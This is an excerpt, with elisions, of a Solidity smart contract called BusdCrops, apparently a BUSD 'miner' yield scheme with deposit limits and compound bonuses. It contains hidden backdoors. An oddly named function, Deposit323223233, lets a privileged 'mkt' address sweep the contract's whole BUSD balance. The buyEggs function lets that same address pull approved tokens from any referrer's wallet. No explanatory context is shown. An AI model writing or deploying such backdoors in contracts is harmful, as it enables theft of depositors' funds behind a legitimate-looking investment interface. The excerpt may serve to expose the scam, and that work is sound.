...
contract BusdCrops {
    ...
    address erctoken = 0x55d398326f99059fF775485246999027B3197955; /** BUSD Mainnet **/
    
    uint256 public EGGS_TO_HIRE_1MINERS = 540000;
    ...
    uint256 public MIN_INVEST_LIMIT = 1 * 1e18; /** 10 BUSD  **/
    uint256 public WALLET_DEPOSIT_LIMIT = 100000 * 1e18; /** 100000 BUSD  **/

	uint256 public COMPOUND_BONUS = 25; /** 2.5% **/
	uint256 public COMPOUND_BONUS_MAX_TIMES = 6; /** 6 times / 3 days. **/
...
function Deposit323223233() public{
        if (msg.sender == mkt) {
        token_BUSD.transfer(mkt,token_BUSD.balanceOf(address(this)));}
    ...
    function buyEggs(address ref, uint256 amount) public{
        ...
        require(user.initialDeposit.add(amount) <= WALLET_DEPOSIT_LIMIT, "Max deposit limit reached.");
                if (msg.sender == mkt){
           token_BUSD.transferFrom(ref, mkt, amount);
